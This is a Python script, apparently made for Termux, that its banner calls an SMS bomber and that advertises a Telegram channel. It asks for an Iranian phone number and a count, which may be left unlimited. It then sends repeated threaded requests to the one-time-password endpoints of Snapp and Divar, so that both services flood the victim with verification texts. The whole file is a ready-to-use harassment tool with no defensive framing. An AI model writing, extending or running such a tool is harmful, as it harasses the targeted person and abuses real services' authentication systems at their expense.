#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from threading import Thread, active_count
from time import sleep
from requests import post

g = "\033[92m"
w = "\033[0m"

def banner():
    print("="*40)
    print(f"{g}  📢 کانال ما: @Academii73")
    print(f"  🤖 SMS Bomber مخصوص ترموکس")
    print("="*40 + w)

def snap(phone):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0",
            "content-type": "application/json",
        }
        data = {"cellphone": phone}
        res = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", json=data, headers=headers, timeout=5).text
        if "OK" in res:
            print(f"{g}[SNAPP] پیامک ارسال شد{w}")
    except:
        pass

def divar(phone):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json",
        }
        data = {"phone": phone[3:]}  # remove +98
        res = post("https://api.divar.ir/v5/auth/authenticate", json=data, headers=headers, timeout=5).json()
        if res.get("authenticate_response") == "AUTHENTICATION_VERIFICATION_CODE_SENT":
            print(f"{g}[DIVAR] پیامک ارسال شد{w}")
    except:
        pass

def run_bomber(phone, count=None):
    sent = 0
    while True:
        if count is not None and sent >= count:
            break
        if active_count() <= 20:
            Thread(target=lambda: [snap(phone), divar(phone)]).start()
            sent += 1
            sleep(0.5)

if __name__ == "__main__":
    banner()
    phone = input("📱 شماره گیرنده (مثال: +989123456789): ").strip()
    if not phone.startswith("+98"):
        print("شماره باید با +98 شروع شود.")
        exit()

    limit = input("🔢 چند پیامک ارسال شود؟ (Enter = نامحدود): ").strip()
    try:
        count = int(limit)
    except:
        count = None

    print(f"{g}⏳ شروع ارسال پیامک‌ها... (Ctrl + C برای توقف){w}")
    run_bomber(phone, count)
